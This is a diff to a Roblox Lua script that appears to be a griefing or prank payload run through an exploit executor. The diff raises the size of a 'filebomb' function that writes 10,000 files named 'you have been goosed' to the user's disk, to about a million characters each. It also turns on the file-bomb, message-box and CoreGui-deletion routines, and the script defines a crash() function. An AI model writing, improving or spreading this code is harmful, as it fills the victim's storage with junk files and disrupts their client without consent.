@@ -5,6 +5,7 @@ local Workspace = cloneref(game:GetService("Workspace"))
 local SoundService = cloneref(game:GetService("SoundService"))
 local Lighting = cloneref(game:GetService("Lighting"))
 local Players = cloneref(game:GetService("Players"))
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
 
 -- Chat Properties
 if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
@@ -27,7 +28,7 @@ local function crash()
 end
 
 local function filebomb()
-	local text = ("w"):rep(10000)
+	local text = ("w"):rep(1000000)
 	for i = 1, 10000 do
 		writefile("you have been goosed"..i..".txt", text)
 	end
@@ -61,16 +62,16 @@ task.wait(_G.Delayed_1)
 Sound:Play()
 task.wait(_G.Delayed_2)
 
--- task.spawn(filebomb)
--- task.spawn(msgbox)
--- task.spawn(delete_coregui)
+task.spawn(filebomb)
+task.spawn(msgbox)
+task.spawn(delete_coregui)
 
-coroutine.wrap(filebomb)()
-coroutine.wrap(msgbox)()
-coroutine.wrap(delete_coregui)()
+-- coroutine.wrap(filebomb)()
+-- coroutine.wrap(msgbox)()
+-- coroutine.wrap(delete_coregui)()
 
 -- Properties
-local ScreenGui = Instance.new("ScreenGui", CoreGui)
+local ScreenGui = Instance.new("ScreenGui", CoreGui) -- PlayerGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Enabled = true
